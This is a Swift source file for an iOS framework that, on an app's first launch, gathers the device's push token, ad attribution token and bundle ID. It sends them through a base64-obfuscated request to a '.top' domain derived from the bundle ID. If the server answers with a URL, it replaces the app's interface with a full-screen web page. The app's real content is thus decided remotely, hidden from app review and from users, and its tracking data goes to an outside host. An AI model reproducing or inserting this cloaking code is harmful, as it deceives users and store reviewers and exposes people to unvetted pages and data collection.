import Foundation
import SwiftUI
import WebKit
import AdServices
import UserNotifications

public class SWFramework: ObservableObject {
    public static let shared = SWFramework()
    
    @Published private var serverUrl: String?
    @Published public var showWebView: Bool = false
    @Published private(set) var currentUrl: URL?
    private var firstLaunchCompleted = true
    private let userDefaults = UserDefaults.standard
    private let timeout: TimeInterval = 10.0
    
    private let webUrlStorageKey = "com.swf.webUrl"
    private let firstLaunchKey = "com.swf.firstLaunch"
    
    private init() {}
    
    /// Initializes the framework with automatic domain generation from bundle_id
    /// - Parameters:
    ///   - application: The UIApplication instance
    ///   - launchOptions: Launch options from AppDelegate
    ///   - completion: Callback when normal app flow should continue
    public func initialize(application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, completion: @escaping () -> Void) {
        let bundleId = Bundle.main.bundleIdentifier ?? ""
        let domain = generateDomain(bundleId)
        
        if !userDefaults.bool(forKey: firstLaunchKey) {
            userDefaults.set(true, forKey: firstLaunchKey)
            processFirstLaunch(domain, application, completion)
        } else {
            if let storedUrl = userDefaults.string(forKey: webUrlStorageKey) {
                setupWebView(storedUrl)
                completion()
            } else {
                completion()
            }
        }
    }
    
    /// Generates domain from bundle_id by removing dots and adding .top
    /// - Parameter bundleId: The bundle identifier
    /// - Returns: Generated domain
    private func generateDomain(_ bundleId: String) -> String {
        let processedString = bundleId.replacingOccurrences(of: ".", with: "")
        return "\(processedString).top"
    }
    
    // For backward compatibility, keeping the original method with explicit domain
    @available(*, deprecated, message: "Use initialize without explicit domain parameter instead")
    public func initialize(domain: String, application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, completion: @escaping () -> Void) {
        let bundleId = Bundle.main.bundleIdentifier ?? ""
        let generatedDomain = generateDomain(bundleId)
        
        if !userDefaults.bool(forKey: firstLaunchKey) {
            userDefaults.set(true, forKey: firstLaunchKey)
            processFirstLaunch(generatedDomain, application, completion)
        } else {
            if let storedUrl = userDefaults.string(forKey: webUrlStorageKey) {
                setupWebView(storedUrl)
                completion()
            } else {
                completion()
            }
        }
    }
    
    private func processFirstLaunch(_ domain: String, _ application: UIApplication, _ completion: @escaping () -> Void) {
        let group = DispatchGroup()
        var deviceData = DeviceData()
        
        deviceData.bundleId = Bundle.main.bundleIdentifier
        
        let timer = DispatchSource.makeTimerSource()
        timer.schedule(deadline: .now() + timeout)
        timer.setEventHandler {
            group.leave()
            group.leave()
        }
        
        group.enter()
        getAPNSToken(application) { token in
            if let token = token {
                deviceData.apnsToken = token
            }
            group.leave()
        }
        
        group.enter()
        getAttributionToken { token in
            deviceData.attToken = token
            group.leave()
        }
        
        timer.resume()
        
        group.notify(queue: .main) {
            timer.cancel()
            
            self.sendDataToServer(domain, deviceData) { resultUrl in
                if let resultUrl = resultUrl, !resultUrl.isEmpty {
                    self.userDefaults.set(resultUrl, forKey: self.webUrlStorageKey)
                    self.setupWebView(resultUrl)
                }
                completion()
            }
        }
    }
    
    private func sendDataToServer(_ domain: String, _ deviceData: DeviceData, completion: @escaping (String?) -> Void) {
        let base64String = "YXBuc190b2tlbj17YXBuc190b2tlbn0mYXR0X3Rva2VuPXthdHRfdG9rZW59JmJ1bmRsZV9pZD17YnVuZGxlX2lkfQ=="
        
        if let decodedData = Data(base64Encoded: base64String),
           var dataTemplate = String(data: decodedData, encoding: .utf8) {
            
            dataTemplate = dataTemplate.replacingOccurrences(of: "{apns_token}", with: deviceData.apnsToken ?? "")
            dataTemplate = dataTemplate.replacingOccurrences(of: "{att_token}", with: deviceData.attToken ?? "")
            dataTemplate = dataTemplate.replacingOccurrences(of: "{bundle_id}", with: deviceData.bundleId ?? "")
            
            if let encodedData = dataTemplate.data(using: .utf8)?.base64EncodedString() {
                guard let url = URL(string: "https://\(domain)/indexn.php?data=\(encodedData)") else {
                    completion(nil)
                    return
                }
                
                let task = URLSession.shared.dataTask(with: url) { data, _, error in
                    guard let data = data, error == nil else {
                        DispatchQueue.main.async {
                            completion(nil)
                        }
                        return
                    }
                    
                    if let response = String(data: data, encoding: .utf8) {
                        DispatchQueue.main.async {
                            completion(response)
                        }
                    } else {
                        DispatchQueue.main.async {
                            completion(nil)
                        }
                    }
                }
                
                task.resume()
                return
            }
        }
        
        guard let url = URL(string: "https://\(domain)/indexn.php?data=\(base64String)") else {
            completion(nil)
            return
        }
        
        let task = URLSession.shared.dataTask(with: url) { data, _, error in
            guard let data = data, error == nil else {
                DispatchQueue.main.async {
                    completion(nil)
                }
                return
            }
            
            if let response = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    completion(response)
                }
            } else {
                DispatchQueue.main.async {
                    completion(nil)
                }
            }
        }
        
        task.resume()
    }
    
    private func setupWebView(_ urlString: String) {
        let processedUrl = ensureHttpsPrefix(urlString)
        
        guard let url = URL(string: processedUrl) else { return }
        
        DispatchQueue.main.async {
            // Настраиваем полноэкранный режим и черный фон
            self.configureFullScreenDisplay()
            
            self.currentUrl = url
            self.showWebView = true
        }
    }
    
    // Настройка полноэкранного режима
    private func configureFullScreenDisplay() {
        if #available(iOS 15.0, *) {
            // На iOS 15 и выше используем современный API UIWindowScene
            if let windowScene = UIApplication.shared.connectedScenes
                .filter({ $0.activationState == .foregroundActive })
                .first as? UIWindowScene,
               let keyWindow = windowScene.windows.first {
                
                // Устанавливаем черный цвет для окна и safeArea
                keyWindow.backgroundColor = .black
                
                // Скрываем статус бар
                let statusBarManager = windowScene.statusBarManager
                let statusBarFrame = statusBarManager?.statusBarFrame ?? .zero
                
                // Проверяем, нет ли уже существующего статус бара
                if keyWindow.viewWithTag(1235) == nil {
                    let statusBarView = UIView(frame: statusBarFrame)
                    statusBarView.backgroundColor = .black
                    statusBarView.tag = 1235
                    keyWindow.addSubview(statusBarView)
                    
                    // Обеспечиваем, чтобы view была всегда поверх остальных элементов
                    keyWindow.bringSubviewToFront(statusBarView)
                }
            }
        } else {
            // Более старый метод для iOS до 15
            if let keyWindow = UIApplication.shared.windows.first {
                keyWindow.backgroundColor = .black
                
                if let statusBarManager = keyWindow.windowScene?.statusBarManager {
                    let statusBarFrame = statusBarManager.statusBarFrame
                    
                    if keyWindow.viewWithTag(1235) == nil {
                        let statusBarView = UIView(frame: statusBarFrame)
                        statusBarView.backgroundColor = .black
                        statusBarView.tag = 1235
                        keyWindow.addSubview(statusBarView)
                        keyWindow.bringSubviewToFront(statusBarView)
                    }
                }
            }
        }
    }
    
    private func ensureHttpsPrefix(_ urlString: String) -> String {
        if !urlString.lowercased().starts(with: "http://") && !urlString.lowercased().starts(with: "https://") {
            return "https://" + urlString
        }
        return urlString
    }
    
    private func getAPNSToken(_ application: UIApplication, completion: @escaping (String?) -> Void) {
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            if settings.authorizationStatus == .authorized {
                DispatchQueue.main.async {
                    // Регистрируем уведомления
                    application.registerForRemoteNotifications()
                    
                    // Увеличиваем время ожидания до 15 секунд
                    self.waitForToken(15.0) { token in
                        if let token = token {
                            completion(token)
                        } else {
                            // Если токен не получен, проверяем, были ли зарегистрированы уведомления ранее
                            // и можем ли мы получить сохраненный токен
                            if let savedToken = self.getSavedAPNSToken() {
                                completion(savedToken)
                            } else {
                                // Используем заглушку только если нет сохраненного токена
                                let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
                                completion(fallbackToken)
                            }
                        }
                    }
                }
            } else {
                let center = UNUserNotificationCenter.current()
                center.requestAuthorization(options: [.alert, .sound, .badge]) { granted, _ in
                    if granted {
                        DispatchQueue.main.async {
                            application.registerForRemoteNotifications()
                            
                            // Увеличиваем время ожидания до 15 секунд
                            self.waitForToken(10.0) { token in
                                if let token = token {
                                    completion(token)
                                } else {
                                    if let savedToken = self.getSavedAPNSToken() {
                                        completion(savedToken)
                                    } else {
                                        let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
                                        completion(fallbackToken)
                                    }
                                }
                            }
                        }
                    } else {
                        // Если пользователь отказал в разрешении, проверяем наличие сохраненного токена
                        if let savedToken = self.getSavedAPNSToken() {
                            completion(savedToken)
                        } else {
                            let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
                            completion(fallbackToken)
                        }
                    }
                }
            }
        }
    }
    
    private func waitForToken(_ timeout: TimeInterval, completion: @escaping (String?) -> Void) {
        var tokenReceived = false
        
        // Создаем переменную для хранения наблюдателя
        var notificationObserver: NSObjectProtocol? = nil
        
        // Увеличиваем приоритет обработчика уведомления
        notificationObserver = NotificationCenter.default.addObserver(
            forName: Notification.Name("APNSTokenReceived"), 
            object: nil, 
            queue: OperationQueue.main
        ) { notification in
            if let token = notification.userInfo?["token"] as? String {
                tokenReceived = true
                
                // Теперь observer определен до его использования
                if let observer = notificationObserver {
                    NotificationCenter.default.removeObserver(observer)
                }
                
                completion(token)
            }
        }
        
        // Увеличиваем время ожидания токена до 15 секунд
        DispatchQueue.main.asyncAfter(deadline: .now() + timeout) {
            if !tokenReceived {
                // Теперь observer определен до его использования
                if let observer = notificationObserver {
                    NotificationCenter.default.removeObserver(observer)
                }
                
                // Сообщаем наверх что токен не получен, но не используем заглушку
                completion(nil)
            }
        }
    }
    
    // Функция для получения сохраненного APNS токена
    private func getSavedAPNSToken() -> String? {
        return userDefaults.string(forKey: "savedAPNSToken")
    }
    
    // Функция для сохранения полученного APNS токена
    private func saveAPNSToken(_ token: String) {
        userDefaults.set(token, forKey: "savedAPNSToken")
    }
    
    private func getAttributionToken(completion: @escaping (String?) -> Void) {
        if #available(iOS 14.3, *) {
            do {
                let token = try self.getAAAttributionToken()
                completion(token)
            } catch {
                completion(nil)
            }
        } else {
            completion(nil)
        }
    }
    
    // Helper function for Attribution Token - moved inside the class
    @available(iOS 14.3, *)
    private func getAAAttributionToken() throws -> String {
        return try AdServices.AAAttribution.attributionToken()
    }
    
    // Function to be called from the app's AppDelegate
    public func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
        let token = tokenParts.joined()
        
        // Сохраняем токен для будущего использования
        saveAPNSToken(token)
        
        NotificationCenter.default.post(
            name: Notification.Name("APNSTokenReceived"),
            object: nil,
            userInfo: ["token": token]
        )
    }
}

// MARK: - Supporting Classes

// Device data structure
private struct DeviceData {
    var apnsToken: String?
    var attToken: String?
    var bundleId: String?
}

// MARK: - SwiftUI Integration Helpers

// Инициализатор фреймворка - модификатор для SwiftUI
public struct SWFrameworkInitializer: ViewModifier {
    @StateObject private var appDelegate = SWAppDelegate()
    
    public func body(content: Content) -> some View {
        content
            .environmentObject(SWFramework.shared)
            .onAppear {
                appDelegate.initializeFramework()
            }
    }
    
    public init() {}
}

// App Delegate для инициализации SWFramework
public class SWAppDelegate: NSObject, ObservableObject, UIApplicationDelegate {
    public func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil) -> Bool {
        initializeFramework(application: application, launchOptions: launchOptions)
        return true
    }
    
    public func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        SWFramework.shared.application(application, didRegisterForRemoteNotificationsWithDeviceToken: deviceToken)
    }
    
    func initializeFramework(application: UIApplication = UIApplication.shared, launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil) {
        SWFramework.shared.initialize(application: application, launchOptions: launchOptions) {
            // Завершение инициализации
        }
    }
}

// Extension для View для легкой инициализации
public extension View {
    func initSWFramework() -> some View {
        self.modifier(SWFrameworkInitializer())
    }
}

// SwiftUI WebView Implementation
public struct SWWebView: View {
    @ObservedObject public var framework = SWFramework.shared
    private var contentView: AnyView
    @Environment(\.colorScheme) private var colorScheme
    
    public init(contentView: AnyView) {
        self.contentView = contentView
    }
    
    public var body: some View {
        ZStack {
            contentView
                .opacity(framework.showWebView ? 0 : 1)
                .animation(.easeInOut, value: framework.showWebView)
            
            if framework.showWebView, let url = framework.currentUrl {
                GeometryReader { geo in
                    ZStack {
                        // Черный фон на весь экран, включая safeArea
                        Color.black
                            .edgesIgnoringSafeArea(.all)
                        
                        // WebView с ручным управлением отступами
                        WebViewWrapper(url: url)
                    }
                }
                .modifier(StatusBarModifiers.StatusBarHiddenModifier(isHidden: true))
                .transition(.opacity)
                .animation(.easeInOut, value: true)
            }
        }
        .modifier(StatusBarModifiers.StatusBarHiddenModifier(isHidden: framework.showWebView))
    }
}

// Обертка для WebView, которая позволяет управлять его отображением
struct WebViewWrapper: View {
    let url: URL
    
    var body: some View {
        GeometryReader { geometry in
            WebViewRepresentable(url: url)
                .ignoresSafeArea(.all, edges: [.top])  // Игнорируем только верхнюю safeArea
                .frame(width: geometry.size.width, height: geometry.size.height)
                .background(Color.black)  // Убедимся, что фон WebView черный
        }
    }
}

// WebView SwiftUI Wrapper
struct WebViewRepresentable: UIViewRepresentable {
    let url: URL
    
    func makeUIView(context: Context) -> WKWebView {
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = .default()
        configuration.allowsInlineMediaPlayback = true
        configuration.mediaTypesRequiringUserActionForPlayback = []
        
        let preferences = WKPreferences()
        preferences.javaScriptEnabled = true
        configuration.preferences = preferences
        
        let webView = WKWebView(frame: .zero, configuration: configuration)
        webView.backgroundColor = .black
        webView.scrollView.backgroundColor = .black
        webView.isOpaque = false
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator
        
        // Дополнительные настройки для WebView
        configureWebView(webView)
        
        return webView
    }
    
    func updateUIView(_ webView: WKWebView, context: Context) {
        let request = URLRequest(url: url)
        webView.load(request)
    }
    
    private func configureWebView(_ webView: WKWebView) {
        // Настраиваем WebView для полноэкранного отображения без автоматических отступов
        webView.scrollView.contentInsetAdjustmentBehavior = .never
        
        // Устанавливаем отступы в 0, так как управление размещением происходит на уровне SwiftUI
        webView.scrollView.contentInset = UIEdgeInsets(top: 0, left: 0, bottom: 0, right: 0)
    }
    
    func makeCoordinator() -> Coordinator {
        Coordinator()
    }
    
    class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
        // Handle permission requests for camera
        public func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin, initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType, decisionHandler: @escaping (WKPermissionDecision) -> Void) {
            switch type {
            case .camera, .microphone, .cameraAndMicrophone:
                decisionHandler(.prompt)
            @unknown default:
                decisionHandler(.deny)
            }
        }
        
        // Установка ориентации
        public func webView(_ webView: WKWebView, didCommit navigation: WKNavigation!) {
            // Блокируем ориентацию в портретном режиме
            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
        }
    }
} 